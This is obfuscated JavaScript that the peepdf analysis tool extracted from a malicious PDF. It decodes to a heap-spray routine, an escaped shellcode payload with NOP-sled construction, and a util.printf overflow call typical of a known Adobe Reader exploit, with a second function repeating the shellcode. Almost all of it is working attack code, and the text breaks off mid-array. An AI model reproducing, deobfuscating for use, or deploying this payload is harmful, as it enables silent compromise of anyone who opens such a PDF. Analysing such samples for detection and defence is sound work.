// peepdf comment: Javascript code located in object 7 (version 0)

var fgmou = '';
ahmty = "";
afpz = true;
hotx = 13512;
bnpqs = 44131;
bdgksu = 45758;
demnr = "";
hlrtw = "hlrtw";
bestu = "";
glmx = "glmx";
gijpru = 54769;
chjkx = "";
bjko = "";
var abhw = "",
    qrsu = "",
    dhko = '',
    ixzk = "",
    tbzcq = 62150,
    bjrvx = 0,
    ijnptu = String,
    befot = ijnptu['fYrYokm9C5h9akr9CYo9dkek'.replace(/[kL9Y5]/g, '')],
    tfuz = String,
    acglpx = tfuz['efv1a1lH'.replace(/[HPf1E]/g, '')],
    yqebzt = "99",
    ehirx = "",
    fikuv = [70, 67, 66, 159, 174, 167, 156, 173, 162, 168, 167, 89, 159, 162, 177, 152, 162, 173, 97, 178, 154, 171, 172, 169, 101, 89, 165, 158, 167, 98, 180, 70, 67, 66, 66, 176, 161, 162, 165, 158, 89, 97, 178, 154, 171, 172, 169, 103, 165, 158, 167, 160, 173, 161, 89, 99, 89, 107, 89, 117, 89, 165, 158, 167, 98, 180, 70, 67, 66, 66, 66, 178, 154, 171, 172, 169, 89, 100, 118, 89, 178, 154, 171, 172, 169, 116, 70, 67, 66, 66, 182, 70, 67, 66, 66, 178, 154, 171, 172, 169, 89, 118, 89, 178, 154, 171, 172, 169, 103, 172, 174, 155, 172, 173, 171, 162, 167, 160, 97, 105, 101, 89, 165, 158, 167, 104, 107, 98, 116, 70, 67, 66, 66, 171, 158, 173, 174, 171, 167, 89, 178, 154, 171, 172, 169, 116, 70, 67, 66, 182, 70, 67, 70, 67, 66, 159, 174, 167, 156, 173, 162, 168, 167, 89, 174, 173, 162, 165, 152, 169, 171, 162, 167, 173, 159, 97, 98, 180, 70, 67, 66, 66, 175, 154, 171, 89, 169, 154, 178, 165, 168, 154, 157, 89, 118, 89, 174, 167, 158, 172, 156, 154, 169, 158, 97, 91, 94, 174, 126, 123, 126, 114, 94, 174, 105, 105, 105, 106, 94, 174, 110, 111, 105, 105, 94, 174, 122, 106, 111, 109, 94, 174, 105, 105, 108, 105, 94, 174, 105, 105, 105, 105, 94, 174, 109, 105, 113, 123, 94, 174, 113, 123, 105, 124, 94, 174, 106, 124, 112, 105, 94, 174, 113, 123, 122, 125, 94, 174, 105, 113, 109, 105, 94, 174, 124, 108, 110, 126, 94, 174, 113, 123, 110, 110, 94, 174, 113, 123, 126, 124, 94, 174, 105, 113, 109, 110, 94, 174, 108, 108, 110, 107, 94, 174, 124, 106, 125, 107, 94, 174, 105, 108, 124, 107, 94, 174, 106, 105, 108, 107, 94, 174, 113, 105, 109, 105, 94, 174, 105, 105, 108, 113, 94, 174, 127, 110, 112, 110, 94, 174, 124, 107, 113, 123, 94, 174, 110, 125, 110, 122, 94, 174, 105, 109, 124, 107, 94, 174, 110, 110, 105, 105, 94, 174, 126, 124, 113, 123, 94, 174, 110, 106, 110, 106, 94, 174, 110, 111, 110, 108, 94, 174, 111, 105, 110, 112, 94, 174, 110, 125, 113, 123, 94, 174, 108, 108, 105, 113, 94, 174, 113, 123, 124, 105, 94, 174, 105, 124, 112, 110, 94, 174, 127, 126, 113, 123, 94, 174, 112, 111, 105, 108, 94, 174, 113, 123, 108, 124, 94, 174, 112, 113, 109, 126, 94, 174, 124, 127, 105, 108, 94, 174, 110, 106, 113, 123, 94, 174, 110, 107, 106, 124, 94, 174, 110, 106, 113, 123, 94, 174, 110, 107, 107, 109, 94, 174, 112, 106, 113, 123, 94, 174, 109, 126, 106, 109, 94, 174, 112, 110, 113, 114, 94, 174, 113, 123, 127, 124, 94, 174, 107, 105, 112, 106, 94, 174, 127, 112, 105, 108, 94, 174, 109, 122, 114, 114, 94, 174, 109, 107, 122, 125, 94, 174, 108, 123, 111, 105, 94, 174, 127, 124, 110, 110, 94, 174, 105, 109, 112, 110, 94, 174, 124, 105, 108, 108, 94, 174, 108, 112, 126, 123, 94, 174, 127, 127, 108, 108, 94, 174, 109, 110, 105, 108, 94, 174, 114, 112, 105, 124, 94, 174, 124, 127, 113, 123, 94, 174, 112, 110, 122, 126, 94, 174, 107, 123, 127, 125, 94, 174, 109, 127, 127, 114, 94, 174, 126, 113, 110, 106, 94, 174, 127, 127, 114, 109, 94, 174, 127, 127, 127, 127, 94, 174, 124, 108, 108, 123, 94, 174, 112, 109, 111, 106, 94, 174, 126, 123, 105, 107, 94, 174, 113, 123, 125, 114, 94, 174, 105, 124, 109, 110, 94, 174, 110, 126, 114, 107, 94, 174, 127, 107, 105, 108, 94, 174, 126, 105, 125, 106, 94, 174, 124, 111, 105, 108, 94, 174, 124, 114, 108, 108, 94, 174, 123, 112, 105, 127, 94, 174, 110, 127, 105, 113, 94, 174, 126, 106, 124, 106, 94, 174, 105, 108, 105, 107, 94, 174, 105, 108, 124, 122, 94, 174, 113, 123, 124, 127, 94, 174, 105, 108, 105, 106, 94, 174, 113, 114, 124, 107, 94, 174, 127, 113, 109, 110, 94, 174, 113, 123, 111, 106, 94, 174, 127, 113, 109, 110, 94, 174, 110, 126, 110, 127, 94, 174, 124, 114, 110, 123, 94, 174, 110, 110, 124, 108, 94, 174, 126, 124, 113, 123, 94, 174, 126, 113, 110, 106, 94, 174, 127, 127, 109, 114, 94, 174, 127, 127, 127, 127, 94, 174, 111, 113, 110, 105, 94, 174, 111, 105, 126, 113, 94, 174, 105, 109, 123, 127, 94, 174, 111, 124, 126, 113, 94, 174, 127, 127, 127, 127, 94, 174, 108, 108, 127, 127, 94, 174, 110, 107, 125, 107, 94, 174, 127, 127, 110, 107, 94, 174, 105, 113, 112, 110, 94, 174, 125, 105, 127, 127, 94, 174, 109, 110, 113, 114, 94, 174, 113, 123, 127, 124, 94, 174, 127, 124, 109, 110, 94, 174, 124, 108, 124, 114, 94, 174, 113, 123, 110, 110, 94, 174, 113, 108, 126, 124, 94, 174, 105, 124, 126, 124, 94, 174, 109, 110, 113, 125, 94, 174, 110, 105, 127, 109, 94, 174, 109, 110, 124, 111, 94, 174, 112, 110, 127, 109, 94, 174, 109, 110, 124, 111, 94, 174, 112, 107, 127, 110, 94, 174, 109, 110, 124, 111, 94, 174, 111, 124, 127, 111, 94, 174, 109, 110, 124, 111, 94, 174, 111, 125, 127, 112, 94, 174, 109, 110, 124, 111, 94, 174, 111, 127, 127, 113, 94, 174, 109, 110, 124, 111, 94, 174, 111, 126, 127, 114, 94, 174, 109, 110, 124, 111, 94, 174, 107, 126, 127, 122, 94, 174, 109, 110, 124, 111, 94, 174, 111, 109, 127, 123, 94, 174, 109, 110, 124, 111, 94, 174, 111, 124, 127, 124, 94, 174, 109, 110, 124, 111, 94, 174, 111, 124, 127, 125, 94, 174, 109, 110, 124, 111, 94, 174, 105, 105, 127, 126, 94, 174, 122, 105, 126, 113, 94, 174, 127, 127, 127, 127, 94, 174, 110, 105, 127, 127, 94, 174, 110, 125, 111, 113, 94, 174, 106, 106, 113, 122, 94, 174, 126, 113, 106, 111, 94, 174, 127, 127, 106, 110, 94, 174, 127, 127, 127, 127, 94, 174, 124, 109, 113, 108, 94, 174, 113, 110, 105, 124, 94, 174, 112, 109, 124, 105, 94, 174, 111, 122, 106, 110, 94, 174, 111, 122, 105, 105, 94, 174, 127, 127, 105, 105, 94, 174, 105, 124, 112, 110, 94, 174, 112, 110, 127, 127, 94, 174, 111, 122, 105, 113, 94, 174, 127, 127, 105, 105, 94, 174, 113, 110, 125, 105, 94, 174, 112, 110, 124, 105, 94, 174, 109, 105, 105, 108, 94, 174, 124, 108, 124, 114, 94, 174, 124, 105, 108, 108, 94, 174, 124, 108, 124, 114, 94, 174, 108, 108, 110, 112, 94, 174, 113, 123, 124, 105, 94, 174, 107, 109, 109, 124, 94, 174, 113, 123, 105, 124, 94, 174, 107, 109, 112, 124, 94, 174, 127, 124, 105, 113, 94, 174, 122, 122, 127, 108, 94, 174, 124, 108, 110, 127, 94, 174, 109, 124, 113, 123, 94, 174, 105, 109, 107, 109, 94, 174, 108, 114, 113, 105, 94, 174, 113, 123, 105, 105, 94, 174, 112, 109, 124, 106, 94, 174, 109, 105, 105, 111, 94, 174, 108, 113, 113, 105, 94, 174, 112, 110, 105, 105, 94, 174, 107, 123, 127, 122, 94, 174, 124, 108, 124, 106, 94, 174, 113, 123, 110, 110, 94, 174, 113, 108, 126, 124, 94, 174, 111, 109, 126, 124, 94, 174, 113, 125, 110, 108, 94, 174, 127, 105, 109, 110, 94, 174, 108, 108, 110, 112, 94, 174, 110, 105, 125, 123, 94, 174, 109, 110, 124, 111, 94, 174, 111, 123, 127, 105, 94, 174, 109, 110, 124, 111, 94, 174, 111, 110, 127, 106, 94, 174, 109, 110, 124, 111, 94, 174, 112, 107, 127, 107, 94, 174, 109, 110, 124, 111, 94, 174, 111, 126, 127, 108, 94, 174, 109, 110, 124, 111, 94, 174, 111, 110, 127, 109, 94, 174, 109, 110, 124, 111, 94, 174, 111, 124, 127, 110, 94, 174, 109, 110, 124, 111, 94, 174, 108, 108, 127, 111, 94, 174, 109, 110, 124, 111, 94, 174, 108, 107, 127, 112, 94, 174, 109, 110, 124, 111, 94, 174, 107, 126, 127, 113, 94, 174, 109, 110, 124, 111, 94, 174, 111, 109, 127, 114, 94, 174, 109, 110, 124, 111, 94, 174, 111, 124, 127, 122, 94, 174, 109, 110, 124, 111, 94, 174, 111, 124, 127, 123, 94, 174, 110, 125, 113, 113, 94, 174, 126, 113, 127, 124, 94, 174, 127, 127, 105, 123, 94, 174, 127, 127, 127, 127, 94, 174, 111, 113, 110, 105, 94, 174, 109, 108, 111, 113, 94, 174, 113, 126, 127, 114, 94, 174, 113, 105, 126, 113, 94, 174, 127, 127, 127, 126, 94, 174, 113, 123, 127, 127, 94, 174, 113, 125, 127, 113, 94, 174, 114, 124, 109, 110, 94, 174, 109, 109, 111, 122, 94, 174, 126, 113, 110, 105, 94, 174, 127, 127, 112, 126, 94, 174, 127, 127, 127, 127, 94, 174, 109, 110, 113, 125, 94, 174, 111, 122, 126, 105, 94, 174, 110, 105, 106, 105, 94, 174, 112, 108, 126, 113, 94, 174, 127, 127, 127, 127, 94, 174, 113, 108, 127, 127, 94, 174, 106, 124, 124, 109, 94, 174, 109, 110, 113, 125, 94, 174, 110, 105, 126, 105, 94, 174, 109, 110, 113, 125, 94, 174, 110, 105, 114, 124, 94, 174, 110, 108, 110, 108, 94, 174, 110, 108, 110, 108, 94, 174, 110, 108, 110, 108, 94, 174, 112, 110, 127, 127, 94, 174, 124, 112, 105, 113, 94, 174, 114, 124, 109, 110, 94, 174, 105, 105, 109, 109, 94, 174, 105, 105, 105, 105, 94, 174, 127, 127, 110, 108, 94, 174, 110, 127, 125, 112, 94, 174, 123, 111, 105, 127, 94, 174, 110, 123, 124, 105, 94, 174, 124, 108, 124, 114, 94, 174, 113, 123, 110, 110, 94, 174, 110, 106, 126, 124, 94, 174, 110, 108, 110, 106, 94, 174, 110, 112, 110, 111, 94, 174, 109, 107, 111, 122, 94, 174, 112, 107, 126, 113, 94, 174, 105, 105, 105, 105, 94, 174, 113, 123, 105, 105, 94, 174, 108, 108, 125, 113, 94, 174, 113, 110, 127, 111, 94, 174, 110, 114, 125, 123, 94, 174, 109, 110, 124, 112, 94, 174, 111, 106, 127, 113, 94, 174, 111, 110, 107, 126, 94, 174, 124, 112, 112, 113, 94, 174, 127, 124, 109, 110, 94, 174, 105, 105, 111, 110, 94, 174, 105, 105, 105, 105, 94, 174, 110, 111, 112, 126, 94, 174, 109, 110, 113, 125, 94, 174, 110, 105, 127, 113, 94, 174, 126, 113, 110, 111, 94, 174, 105, 105, 110, 106, 94, 174, 105, 105, 105, 105, 94, 174, 110, 105, 110, 114, 94, 174, 123, 106, 126, 113, 94, 174, 127, 127, 127, 126, 94, 174, 113, 110, 127, 127, 94, 174, 110, 114, 124, 105, 94, 174, 112, 109, 110, 114, 94, 174, 113, 125, 108, 114, 94, 174, 105, 106, 109, 111, 94, 174, 126, 113, 110, 105, 94, 174, 105, 105, 108, 123, 94, 174, 105, 105, 105, 105, 94, 174, 127, 113, 113, 123, 94, 174, 109, 110, 113, 125, 94, 174, 110, 105, 127, 113, 94, 174, 107, 106, 126, 113, 94, 174, 127, 127, 127, 127, 94, 174, 113, 110, 127, 127, 94, 174, 110, 114, 124, 105, 94, 174, 112, 109, 110, 114, 94, 174, 110, 112, 105, 124, 94, 174, 105, 106, 126, 113, 94, 174, 127, 127, 127, 127, 94, 174, 110, 114, 127, 127, 94, 174, 109, 109, 124, 111, 94, 174, 127, 127, 108, 113, 94, 174, 110, 105, 112, 108, 94, 174, 109, 110, 113, 125, 94, 174, 127, 126, 127, 113, 94, 174, 110, 113, 105, 105, 94, 174, 109, 110, 113, 125, 94, 174, 110, 105, 127, 113, 94, 174, 126, 113, 110, 112, 94, 174, 127, 126, 112, 109, 94, 174, 127, 127, 127, 127, 94, 174, 110, 114, 110, 114, 94, 174, 109, 111, 109, 111, 94, 174, 127, 108, 108, 123, 94, 174, 122, 122, 112, 124, 94, 174, 110, 126, 110, 127, 94, 174, 124, 114, 110, 123, 94, 174, 110, 110, 124, 108, 94, 174, 126, 124, 113, 123, 94, 174, 110, 108, 110, 106, 94, 174, 111, 105, 111, 111, 94, 174, 108, 107, 123, 106, 94, 174, 105, 105, 126, 113, 94, 174, 105, 105, 105, 105, 94, 174, 110, 113, 105, 105, 94, 174, 105, 113, 108, 113, 94, 174, 105, 108, 112, 109, 94, 174, 126, 123, 109, 105, 94, 174, 109, 105, 127, 114, 94, 174, 110, 125, 113, 123, 94, 174, 113, 105, 105, 113, 94, 174, 109, 107, 127, 123, 94, 174, 105, 113, 112, 110, 94, 174, 125, 123, 108, 108, 94, 174, 106, 113, 113, 122, 94, 174, 124, 108, 113, 123, 94, 174, 106, 112, 126, 123, 94, 174, 106, 113, 108, 113, 94, 174, 106, 106, 112, 111, 94, 174, 108, 108, 109, 105, 94, 174, 113, 109, 124, 114, 94, 174, 112, 109, 125, 123, 94, 174, 109, 105, 105, 124, 94, 174, 105, 113, 108, 113, 94, 174, 127, 123, 112, 110, 94, 174, 127, 126, 109, 105, 94, 174, 126, 123, 124, 123, 94, 174, 108, 108, 127, 107, 94, 174, 113, 114, 124, 105, 94, 174, 127, 124, 109, 110, 94, 174, 109, 110, 113, 123, 94, 174, 110, 123, 127, 124, 94, 174, 124, 108, 124, 114, 94, 174, 105, 107, 108, 107, 94, 174, 112, 109, 111, 113, 94, 174, 112, 105, 112, 109, 94, 174, 107, 127, 108, 122, 94, 174, 111, 114, 107, 127, 94, 174, 111, 106, 111, 125, 94, 174, 111, 110, 111, 112, 94, 174, 107, 125, 112, 108, 94, 174, 111, 126, 111, 109, 94, 174, 107, 126, 112, 108, 94, 174, 111, 127, 111, 108, 94, 174, 107, 127, 111, 125, 94, 174, 111, 123, 111, 106, 94, 174, 111, 126, 111, 124, 94, 174, 112, 113, 111, 127, 94, 174, 107, 126, 108, 107, 94, 174, 112, 113, 111, 110, 94, 174, 105, 105, 111, 110, 94, 174, 112, 109, 111, 113, 94, 174, 112, 105, 112, 109, 94, 174, 107, 127, 108, 122, 94, 174, 111, 114, 107, 127, 94, 174, 111, 106, 111, 125, 94, 174, 111, 110, 111, 112, 94, 174, 107, 125, 112, 108, 94, 174, 111, 126, 111, 109, 94, 174, 107, 126, 112, 108, 94, 174, 111, 127, 111, 108, 94, 174, 107, 127, 111, 125, 94, 174, 111, 124, 111, 108, 94, 174, 111, 108, 111, 114, 94, 174, 107, 126, 111, 123, 94, 174, 111, 113, 112, 105, 94, 174, 108, 127, 112, 105, 94, 174, 108, 125, 112, 107, 94, 174, 105, 105, 105, 105, 91, 98, 116, 70, 67, 66, 66, 175, 154, 171, 89, 167, 168, 169, 89, 118, 89, 174, 167, 158, 172, 156, 154, 169, 158, 97, 91, 94, 174, 105, 122, 105, 122, 94, 174, 105, 122, 105, 122, 94, 174, 105, 122, 105, 122, 94, 174, 105, 122, 105, 122, 91, 98, 70, 67, 66, 66, 175, 154, 171, 89, 161, 158, 154, 169, 155, 165, 168, 156, 164, 89, 118, 89, 167, 168, 169, 89, 100, 89, 169, 154, 178, 165, 168, 154, 157, 116, 70, 67, 66, 66, 175, 154, 171, 89, 155, 162, 160, 155, 165, 168, 156, 164, 89, 118, 89, 174, 167, 158, 172, 156, 154, 169, 158, 97, 91, 94, 174, 105, 122, 105, 122, 94, 174, 105, 122, 105, 122, 91, 98, 116, 70, 67, 66, 66, 175, 154, 171, 89, 161, 158, 154, 157, 158, 171, 172, 162, 179, 158, 89, 118, 89, 107, 105, 116, 70, 67, 66, 66, 175, 154, 171, 89, 172, 169, 171, 154, 178, 89, 118, 89, 161, 158, 154, 157, 158, 171, 172, 162, 179, 158, 89, 100, 89, 161, 158, 154, 169, 155, 165, 168, 156, 164, 103, 165, 158, 167, 160, 173, 161, 116, 70, 67, 66, 66, 176, 161, 162, 165, 158, 89, 97, 155, 162, 160, 155, 165, 168, 156, 164, 103, 165, 158, 167, 160, 173, 161, 89, 117, 89, 172, 169, 171, 154, 178, 98, 180, 70, 67, 66, 66, 66, 155, 162, 160, 155, 165, 168, 156, 164, 89, 100, 118, 89, 155, 162, 160, 155, 165, 168, 156, 164, 116, 70, 67, 66, 66, 182, 70, 67, 66, 66, 175, 154, 171, 89, 159, 162, 165, 165, 155, 165, 168, 156, 164, 89, 118, 89, 155, 162, 160, 155, 165, 168, 156, 164, 103, 172, 174, 155, 172, 173, 171, 162, 167, 160, 97, 105, 101, 89, 172, 169, 171, 154, 178, 98, 116, 70, 67, 66, 66, 175, 154, 171, 89, 155, 165, 168, 156, 164, 89, 118, 89, 155, 162, 160, 155, 165, 168, 156, 164, 103, 172, 174, 155, 172, 173, 171, 162, 167, 160, 97, 105, 101, 89, 155, 162, 160, 155, 165, 168, 156, 164, 103, 165, 158, 167, 160, 173, 161, 102, 172, 169, 171, 154, 178, 98, 116, 70, 67, 66, 66, 176, 161, 162, 165, 158, 89, 97, 155, 165, 168, 156, 164, 103, 165, 158, 167, 160, 173, 161, 100, 172, 169, 171, 154, 178, 89, 117, 89, 105, 177, 109, 105, 105, 105, 105, 98, 180, 70, 67, 66, 66, 66, 155, 165, 168, 156, 164, 89, 118, 89, 155, 165, 168, 156, 164, 89, 100, 89, 155, 165, 168, 156, 164, 89, 100, 89, 159, 162, 165, 165, 155, 165, 168, 156, 164, 116, 70, 67, 66, 66, 182, 70, 67, 66, 66, 175, 154, 171, 89, 166, 158, 166, 152, 154, 171, 171, 154, 178, 89, 118, 89, 167, 158, 176, 89, 122, 171, 171, 154, 178, 97, 98, 116, 70, 67, 66, 66, 159, 168, 171, 89, 97, 175, 154, 171, 89, 162, 89, 118, 89, 105, 116, 89, 162, 89, 117, 89, 106, 109, 105, 105, 116, 89, 162, 100, 100, 98, 180, 70, 67, 66, 66, 66, 166, 158, 166, 152, 154, 171, 171, 154, 178, 148, 162, 150, 89, 118, 89, 155, 165, 168, 156, 164, 89, 100, 89, 161, 158, 154, 169, 155, 165, 168, 156, 164, 116, 70, 67, 66, 66, 182, 70, 67, 66, 66, 175, 154, 171, 89, 167, 174, 166, 89, 118, 89, 106, 107, 114, 114, 114, 114, 114, 114, 114, 114, 114, 114, 114, 114, 114, 114, 114, 114, 114, 114, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 116, 70, 67, 66, 66, 174, 173, 162, 165, 103, 169, 171, 162, 167, 173, 159, 97, 91, 94, 109, 110, 105, 105, 105, 159, 91, 101, 89, 167, 174, 166, 98, 116, 70, 67, 66, 182, 70, 67, 70, 67, 66, 159, 174, 167, 156, 173, 162, 168, 167, 89, 156, 168, 165, 165, 154, 155, 152, 158, 166, 154, 162, 165, 97, 98, 180, 70, 67, 66, 66, 175, 154, 171, 89, 172, 161, 158, 165, 165, 156, 168, 157, 158, 89, 118, 89, 174, 167, 158, 172, 156, 154, 169, 158, 97, 91, 94, 174, 126, 123, 126, 114, 94, 174, 105, 105, 105, 106, 94, 174, 110, 111, 105, 105, 94, 174, 122, 106, 111, 109, 94, 174, 105, 105, 108, 105, 94, 174, 105, 105, 105, 105, 94, 174, 109, 105, 113, 123, 94, 174, 113, 123, 105, 124, 94, 174, 106, 124, 112, 105, 94, 174, 113, 123, 122, 125, 94, 174, 105, 113, 109, 105, 94, 174, 124, 108, 110, 126, 94, 174, 113, 123, 110, 110, 94, 174, 113, 123, 126, 124, 94, 174, 105, 113, 109, 110, 94, 174, 108, 108, 110, 107, 94, 174, 124, 106, 125, 107, 94, 174, 105, 108, 124, 107, 94, 174, 106, 105, 108, 107, 94, 174, 113, 105, 109, 105, 94, 174, 105, 105, 108, 113, 94, 174, 127, 110, 112, 110, 94, 174, 124, 107, 113, 123, 94, 174, 110, 125, 110, 122, 94, 174, 105, 109, 124, 107, 94, 174, 110, 110, 105, 105, 94, 174, 126, 124, 113, 123, 94, 174, 110, 106, 110, 106, 94, 174, 110, 111, 110, 108, 94, 174, 111, 105, 110, 112, 94, 174, 110, 125, 113, 123, 94, 174, 108, 108, 105, 113, 94, 174, 113, 123, 124, 105, 94, 174, 105, 124, 112, 110, 94, 174, 127, 126, 113, 123, 94, 174, 112, 111, 105, 108, 94, 174, 113, 123, 108, 124, 94, 174, 112, 113, 109, 126, 94, 174, 124, 127, 105, 108, 94, 174, 110, 106, 113, 123, 94, 174, 110, 107, 106, 124, 94, 174, 110, 106, 113, 123, 94, 174, 110, 107, 107, 109, 94, 174, 112, 106, 113, 123, 94, 174, 109, 126, 106, 109, 94, 174, 112, 110, 113, 114, 94, 174, 113, 123, 127, 124, 94, 174, 107, 105, 112, 106, 94, 174, 127, 112, 105, 108, 94, 174, 109, 122, 114, 114, 94, 174, 109, 107, 122, 125, 94, 174, 108, 123, 111, 105, 94, 174, 127, 124, 110, 110, 94, 174, 105, 109, 112, 110, 94, 174, 124, 105, 108, 108, 94, 174, 108, 112, 126, 123, 94, 174, 127, 127, 108, 108, 94, 174, 109, 110, 105, 108, 94, 174, 114, 112, 105, 124, 94, 174, 124, 127, 113, 123, 94, 174, 112, 110, 122, 126, 94, 174, 107, 123, 127, 125, 94, 174, 109, 127, 127, 114, 94, 174, 126, 113, 110, 106, 94, 174, 127, 127, 114, 109, 94, 174, 127, 127, 127, 127, 94, 174, 124, 108, 108, 123, 94, 174, 112, 109, 111, 106, 94, 174, 126, 123, 105, 107, 94, 174, 113, 123, 125, 114, 94, 174, 105, 124, 109, 110, 94, 174, 110, 126, 114, 107, 94, 174, 127, 107, 105, 108, 94, 174, 126, 105, 125, 106, 94, 174, 124, 111, 105, 108, 94, 174, 124, 114, 108, 108, 94, 174, 123, 112, 105, 127, 94, 174, 110, 127, 105, 113, 94, 174, 126, 106, 124, 106, 94, 174, 105, 108, 105, 107, 94, 174, 105, 108, 124, 122, 94, 174, 113, 123, 124, 127, 94, 174, 105, 108, 105, 106, 94, 174, 113, 114, 124, 107, 94, 174, 127, 113, 109, 110, 94, 174, 113, 123, 111, 106, 94, 174, 127, 113, 109, 110, 94, 174, 110, 126, 110, 127, 94, 174, 124, 114, 110, 123, 94, 174, 110, 110, 124, 108, 94, 174, 126, 124, 113, 123, 94, 174, 126, 113, 110, 106, 94, 174, 127, 127, 109, 114, 94, 174, 127, 127, 127, 127, 94, 174, 111, 113, 110, 105, 94, 174, 111, 105, 126, 113, 94, 174, 105, 109, 123, 127, 94, 174, 111, 124, 126, 113, 94, 174, 127, 127, 127, 127, 94, 174, 108, 108, 127, 127, 94, 174, 110, 107, 125, 107, 94, 174, 127, 127, 110, 107, 94, 174, 105, 113, 112, 110, 94, 174, 125, 105, 127, 127, 94, 174, 109, 110, 113, 114, 94, 174, 113, 123, 127, 124, 94, 174, 127, 124, 109, 110, 94, 174, 124, 108, 124, 114, 94, 174, 113, 123, 110, 110, 94, 174, 113, 108, 126, 124, 94, 174, 105, 124, 126, 124, 94, 174, 109, 110, 113, 125, 94, 174, 110, 105, 127, 109, 94, 174, 109, 110, 124, 111, 94, 174, 112, 110, 127, 109, 94, 174, 109, 110, 124, 111, 94, 174, 112, 107, 127, 110, 94, 174, 109, 110, 124, 111, 94, 174, 111, 124, 127, 111, 94, 174, 109, 110, 124, 111, 94, 174, 111, 125, 127, 112, 94, 174, 109, 110, 124, 111, 94, 174, 111, 127, 127, 113, 94, 174, 109, 110, 124, 111, 94, 174, 111, 126, 127, 114, 94, 174, 109, 110, 124, 111, 94, 174, 107, 126, 127, 122, 94, 174, 109, 110, 124, 111, 94, 174, 111, 109, 127, 123, 94, 174, 109, 110, 124, 111, 94, 174, 111, 124, 127, 124, 94, 174, 109, 110, 124, 111, 94, 174, 111, 124, 127, 125, 94, 174, 109, 110, 124, 111, 94, 174, 105, 105, 127, 126, 94, 174, 122, 105, 126, 113, 94, 174, 127, 127, 127, 127, 94, 174, 110, 105, 127, 127, 94, 174, 110, 125, 111, 113, 94, 174, 106, 106, 113, 122, 94, 174, 126, 113, 106, 111, 94, 174, 127, 127, 106, 110, 94, 174, 127, 127, 127, 127, 94, 174, 124, 109, 113, 108, 94, 174, 113, 110, 105, 124, 94, 174, 112, 109, 124, 105, 94, 174, 111, 122, 106, 110, 94, 174, 111, 122, 105, 105, 94, 174, 127, 127, 105, 105, 94, 174, 105, 124, 112, 110, 94, 174, 112, 110, 127, 127, 94, 174, 111, 122, 105, 113, 94, 174, 127, 127, 105, 105, 94, 174, 113, 110, 125, 105, 94, 174, 112, 110, 124, 105, 94, 174, 109, 105, 105, 108, 94, 174, 124, 108, 124, 114, 94, 174, 124, 105, 108, 108, 94, 174, 124, 108, 124, 114, 94, 174, 108, 108, 110, 112, 94, 174, 113, 123, 124, 105, 94, 174, 107, 109, 109, 124, 94, 174, 113, 123, 105, 124, 94, 174, 107, 109, 112, 124, 94, 174, 127, 124, 105, 113, 94, 174, 122, 122, 127, 108, 94, 174, 124, 108, 110, 127, 94, 174, 109, 124, 113, 123, 94, 174, 105, 109, 107, 109, 94, 174, 108, 114, 113, 105, 94, 174, 113, 123, 105, 105, 94, 174, 112, 109, 124, 106, 94, 174, 109, 105, 105, 111, 94, 174, 108, 113, 113, 105, 94, 174, 112, 110, 105, 105, 94, 174, 107, 123, 127, 122, 94, 174, 124, 108, 124, 106, 94, 174, 113, 123, 110, 110, 94, 174, 113, 108, 126, 124, 94, 174, 111, 109, 126, 124, 94, 174, 113, 125, 110, 108, 94, 174, 127, 105, 109, 110, 94, 174, 108, 108, 110, 112, 94, 174, 110, 105, 125, 123, 94, 174, 109, 110, 124, 111, 94, 174, 111, 123, 127, 105, 94, 174, 109, 110, 124, 111, 94, 174, 111, 110, 127, 106, 94, 174, 109, 110, 124, 111, 94, 174, 112, 107, 127, 107, 94, 174, 109, 110, 124, 111, 94, 174, 111, 126, 127, 108, 94, 174, 109, 110, 124, 111, 94, 174, 111, 110, 127, 109, 94, 174, 109, 110, 124, 111, 94, 174, 111, 124, 127, 110, 94, 174, 109, 110, 124, 111, 94, 174, 108, 108, 127, 111, 94, 174, 109, 110, 124, 111, 94, 174, 108, 107, 127, 112, 94, 174, 109, 110, 124, 111, 94, 174, 107, 126, 127, 113, 94, 174, 109, 110, 124, 111, 94, 174, 111, 109, 127, 114, 94, 174, 109, 110, 124, 111, 94, 174, 111, 124, 127, 122, 94, 174, 109, 110, 124, 111, 94, 174, 111, 124, 127, 123, 94, 174, 110, 125, 113, 113, 94, 174, 126, 113, 127, 124, 94, 174, 127, 127, 105, 123, 94, 174, 127, 127, 127, 127, 94, 174, 111, 113, 110, 105, 94, 174, 109, 108, 111, 113, 94, 174, 113, 126, 127, 114, 94, 174, 113, 105, 126, 113, 94, 174, 127, 127, 127, 126, 94, 174, 113, 123, 127, 127, 94, 174, 113, 125, 127, 113, 94, 174, 114, 124, 109, 110, 94, 174, 109, 109, 111, 122, 94, 174, 126, 113, 110, 105, 94, 174, 127, 127, 112, 126, 94, 174, 127, 127, 127, 127, 94, 174, 109, 110, 113, 125, 94, 174, 111, 122, 126, 105, 94, 174, 110, 105, 106, 105, 94, 174, 112, 108, 126, 113, 94, 174, 127, 127, 127, 127, 94, 174, 113, 108, 127, 127, 94, 174, 106, 124, 124, 109, 94, 174, 109, 110, 113, 125, 94, 174, 110, 105, 126, 105, 94, 